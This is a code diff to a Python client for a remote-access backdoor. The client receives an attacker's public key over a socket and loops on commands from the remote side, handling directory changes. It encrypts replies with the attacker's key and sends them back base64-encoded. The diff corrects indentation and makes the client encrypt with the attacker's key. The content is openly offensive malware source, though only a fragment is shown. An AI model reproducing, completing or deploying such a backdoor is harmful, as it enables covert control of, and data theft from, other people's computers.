@@ -18,16 +18,16 @@ attacker_pub_key = s.recv(256).decode()
 print(f'attacker pub key: {attacker_pub_key}')
 
 try:
-  while True:
+    while True:
         data = s.recv(1024)
         if data[:2].decode('utf-8') == 'cd':
             os.chdir(data[3:].decode('utf-8'))
         if len(data) > 0:
-            encrypted_data = asymmetric_encryption.encrypt_message(data.decode('utf-8'), pub_key)
+            encrypted_data = asymmetric_encryption.encrypt_message(data.decode('utf-8'), attacker_pub_key)
             encrypted_data_b64 = base64.b64encode(encrypted_data)
             s.send(encrypted_data_b64)
         else:
             s.send(b' ')
-except ConnectionResetError as e: 
+except ConnectionResetError as e:
     print('attacker disconnected')
 s.close()
